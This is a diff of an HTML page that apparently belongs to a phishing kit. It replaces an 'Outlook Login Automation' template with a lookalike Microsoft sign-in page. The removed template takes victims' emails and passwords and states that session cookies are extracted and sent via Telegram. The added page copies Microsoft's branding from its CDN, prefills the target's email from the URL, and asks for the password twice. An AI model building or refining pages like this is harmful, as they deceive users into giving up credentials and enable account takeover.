@@ -1,172 +1,203 @@
+
 <!DOCTYPE html>
-<html lang="en" data-bs-theme="dark">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Outlook Login Automation</title>
-    <link href="https://cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.29.0/feather.min.css" rel="stylesheet">
-    <link href="{{ url_for('static', filename='css/custom.css') }}" rel="stylesheet">
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
+    background-size: cover;
+  }
+  .logo {
+    margin-bottom: 15px;
+  }
+  .step { font-size: 12px; color: #000; margin: -10px 0 14px 0; opacity: .8; }
+  .muted {
+    color: #000;
+    text-decoration: none;
+    font-size: 13px;
+  }
+  .sigopts {
+    background-color: white;
+    padding: 20px 41px;
+    border-radius: 0;
+    box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+    width: 405px;
+    margin-top: 10px;
+    text-align: left;
+  }
+  .header {
+    margin: 0 0 20px;
+    font-size: 24px;
+    font-weight: bold;
+  }
+  form input {
+    width: 100%;
+    padding: 6px 6px 6px 0;
+    margin-bottom: 10px;
+    border: none;
+    border-bottom: 1px solid #0067b8;
+    background-color: transparent;
+    outline: none;
+  }
+  form div {
+    margin: 15px 0;
+    font-size: 13px;
+  }
+  form button {
+    padding: 6px 32px;
+    border: none;
+    border-radius: 0;
+    cursor: pointer;
+  }
+  .btn-back {
+    background-color: #e0e0e0;
+    color: #000;
+    margin-right: 4px;
+  }
+  .btn-next {
+    background-color: #0078d4;
+    color: white;
+  }
+  .error-msg {
+    color: red;
+    font-weight: normal;
+    margin: 10px 0;
+  }
+  .error-msg span {
+    color: blue;
+    cursor: pointer;
+  }
+</style>
 </head>
 <body>
-    <div class="container mt-5">
-        <div class="row justify-content-center">
-            <div class="col-md-6 col-lg-5">
-                <div class="card shadow-lg">
-                    <div class="card-header text-center bg-primary">
-                        <h3 class="mb-0">
-                            <i data-feather="mail" class="me-2"></i>
-                            Outlook Login Automation
-                        </h3>
-                    </div>
-                    <div class="card-body p-4">
-                        <!-- Flash Messages -->
-                        {% with messages = get_flashed_messages(with_categories=true) %}
-                            {% if messages %}
-                                {% for category, message in messages %}
-                                    <div class="alert alert-{% if category == 'error' %}danger{% elif category == 'success' %}success{% else %}info{% endif %} alert-dismissible fade show" role="alert">
-                                        <i data-feather="{% if category == 'error' %}alert-circle{% elif category == 'success' %}check-circle{% else %}info{% endif %}" class="me-2"></i>
-                                        {{ message }}
-                                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
-                                    </div>
-                                {% endfor %}
-                            {% endif %}
-                        {% endwith %}
 
-                        <!-- Success State -->
-                        {% if success %}
-                            <div class="text-center py-4">
-                                <div class="text-success mb-3">
-                                    <i data-feather="check-circle" style="width: 64px; height: 64px;"></i>
-                                </div>
-                                <h4 class="text-success">Success!</h4>
-                                <p class="text-muted">Login automation completed for <strong>{{ email }}</strong></p>
-                                <p class="small text-muted">Cookies have been extracted and sent via Telegram.</p>
-                                <a href="{{ url_for('index') }}" class="btn btn-primary">
-                                    <i data-feather="refresh-cw" class="me-2"></i>
-                                    Start New Session
-                                </a>
-                            </div>
-                        {% else %}
-                            <!-- Login Form -->
-                            <form method="POST" id="loginForm" class="needs-validation" novalidate>
-                                {{ form.hidden_tag() }}
-                                
-                                {% if step == 'email' or not step %}
-                                    <!-- Email Step -->
-                                    <div class="mb-4">
-                                        <div class="text-center mb-3">
-                                            <h5 class="card-title">Enter your email</h5>
-                                            <p class="text-muted small">We'll verify your domain and proceed to password entry</p>
-                                        </div>
-                                        
-                                        <div class="mb-3">
-                                            <label for="email" class="form-label">
-                                                <i data-feather="mail" class="me-1"></i>
-                                                Email Address
-                                            </label>
-                                            {{ form.email(class="form-control form-control-lg", placeholder="your.email@company.com", value=email or '', required=True) }}
-                                            <div class="invalid-feedback">
-                                                Please provide a valid email address.
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Cloudflare Turnstile -->
-                                        {% if sitekey %}
-                                            <div class="mb-3 d-flex justify-content-center">
-                                                <div class="cf-turnstile" data-sitekey="{{ sitekey }}"></div>
-                                            </div>
-                                        {% endif %}
-                                        
-                                        <div class="d-grid">
-                                            <button type="submit" name="submit" value="Next" class="btn btn-primary btn-lg">
-                                                <i data-feather="arrow-right" class="me-2"></i>
-                                                Next
-                                            </button>
-                                        </div>
-                                    </div>
-                                    
-                                {% elif step == 'password' %}
-                                    <!-- Password Step -->
-                                    <div class="mb-4">
-                                        <div class="text-center mb-3">
-                                            <div class="d-flex align-items-center justify-content-center mb-2">
-                                                <i data-feather="user" class="me-2"></i>
-                                                <span class="fw-bold">{{ email }}</span>
-                                            </div>
-                                            <p class="text-muted small">Enter your password to continue</p>
-                                        </div>
-                                        
-                                        <div class="mb-3">
-                                            <label for="password" class="form-label">
-                                                <i data-feather="lock" class="me-1"></i>
-                                                Password
-                                            </label>
-                                            {{ form.password(class="form-control form-control-lg", placeholder="Enter your password", required=True) }}
-                                            <div class="invalid-feedback">
-                                                Password is required.
-                                            </div>
-                                        </div>
-                                        
-                                        <!-- Security Notice -->
-                                        <div class="alert alert-info d-flex align-items-start">
-                                            <i data-feather="shield" class="me-2 mt-1"></i>
-                                            <small>
-                                                Your credentials will be used to automate login and extract session cookies. 
-                                                This process is secure and your password is not stored.
-                                            </small>
-                                        </div>
-                                        
-                                        <!-- Cloudflare Turnstile -->
-                                        {% if sitekey %}
-                                            <div class="mb-3 d-flex justify-content-center">
-                                                <div class="cf-turnstile" data-sitekey="{{ sitekey }}"></div>
-                                            </div>
-                                        {% endif %}
-                                        
-                                        <div class="d-grid gap-2">
-                                            <button type="submit" name="submit" value="Sign in" class="btn btn-success btn-lg" id="signinBtn">
-                                                <span class="spinner-border spinner-border-sm me-2 d-none" id="signinSpinner"></span>
-                                                <i data-feather="log-in" class="me-2"></i>
-                                                Start Automation
-                                            </button>
-                                            <a href="{{ url_for('index') }}" class="btn btn-outline-secondary">
-                                                <i data-feather="arrow-left" class="me-2"></i>
-                                                Back
-                                            </a>
-                                        </div>
-                                    </div>
-                                {% endif %}
-                            </form>
-                        {% endif %}
-                        
-                        <!-- Session Info (Debug) -->
-                        {% if session_id %}
-                            <div class="mt-4 pt-3 border-top">
-                                <small class="text-muted">
-                                    <i data-feather="info" class="me-1"></i>
-                                    Session ID: <code>{{ session_id[:8] }}...</code>
-                                    <a href="{{ url_for('debug_sessions') }}" class="ms-2 text-decoration-none">Debug</a>
-                                </small>
-                            </div>
-                        {% endif %}
-                    </div>
-                </div>
-                
-                <!-- Additional Info -->
-                <div class="text-center mt-4">
-                    <small class="text-muted">
-                        <i data-feather="help-circle" class="me-1"></i>
-                        This tool automates Microsoft Outlook login and extracts session cookies for authorized testing purposes.
-                    </small>
-                </div>
-            </div>
+<div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">
+
+</div>
+
+<div class="sigopts"><span class="muted">&#128273; Sign-in options</span></div>
+
+<script>
+  let email = "";
+
+  function validateEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email);
+  }
+
+  function showStep1() {
+    const container = document.getElementById("container");
+    container.innerHTML = `
+      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+      <h1 class="header">Sign in</h1>
+      <form id="loginForm">
+        <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
+        <div style="margin: 15px 0; font-size: 13px;">
+          <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">  Create one!</span></span><br><br>
+          <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
         </div>
-    </div>
+        <div style="display: flex; justify-content: flex-end;">
+          <button type="button" class="btn-back" id="btnBack" disabled>Back</button>
+          <button type="submit" class="btn-next">Next</button>
+        </div>
+      </form>
+    `;
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const val = document.getElementById("emailInput").value.trim();
+      if(validateEmail(val)) {
+        email = val;
+        showStep2();
+      } else {
+        alert("Please enter a valid email address.");
+      }
+    });
+  }
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://unpkg.com/feather-icons"></script>
-    <script src="{{ url_for('static', filename='js/app.js') }}"></script>
+  function showStep2() {
+    const container = document.getElementById("container");
+    container.innerHTML = `
+      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 3px;">
+      <div class="muted" style="margin:15px 5px;">← ${email}</div>
+      <h1 class="header">Enter Password</h1>
+<input type="password" id="passwordInput" placeholder="Password" required 
+       style="border: none; outline: none; background: transparent; 
+              border-bottom: 2px solid blue; width: 400px; 
+              padding:  0; display: inline-block;">
+      <form id="loginForm">
+        <div style="margin: 15px 0; font-size: 13px;">
+          <span style="color: #0067b8; text-decoration: none;">Is this your account?</span>
+        </div>
+        <div style="display: flex; justify-content: flex-end;">
+          <button type="button" class="btn-back" id="btnBack">Back</button>
+          <button type="submit" class="btn-next">Next</button>
+        </div>
+      </form>
+    `;
+    document.getElementById("btnBack").addEventListener("click", function(){
+      showStep1();
+    });
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      showStep3();
+    });
+  }
+
+  function showStep3() {
+    const container = document.getElementById("container");
+    container.innerHTML = `
+      <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+      <div class="muted" style="margin:10px 9px;">← ${email}</div>
+      <h1 class="header">Enter Password</h1>
+      <input type="password" id="passwordInput" placeholder="Password" required 
+       style="border: none; outline: none; background: transparent; 
+              border-bottom: 2px solid blue; width: 400px; 
+              padding: 5px 0; display: inline-block;">
+      <form id="loginForm">
+        <div style="margin: 15px 0; font-size: 13px;">
+          <span style="color: #0067b8; text-decoration: none;">Enter your password to continue</span>
+        </div>
+        <div style="display: flex; justify-content: flex-end;">
+          <button type="button" class="btn-back" id="btnBack">Back</button>
+          <button type="submit" class="btn-next">Sign in</button>
+        </div>
+      </form>
+    `;
+    document.getElementById("btnBack").addEventListener("click", function(){
+      showStep2();
+    });
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      alert("Signing in...");
+    });
+  }
+
+  // Prefill from ?email= if present and valid
+  (function prefillFromQuery(){
+    try {
+      const q = new URLSearchParams(window.location.search);
+      const hinted = (q.get("email") || "").trim();
+      if (hinted && validateEmail(hinted)) {
+        email = hinted;
+        showStep2();
+        return;
+      }
+    } catch (_) {}
+  })();
+
+  // Prevent native form submits; we handle transitions ourselves
+
+  if(!email) {
+    showStep1();
+  }
+</script>
+
 </body>
 </html>
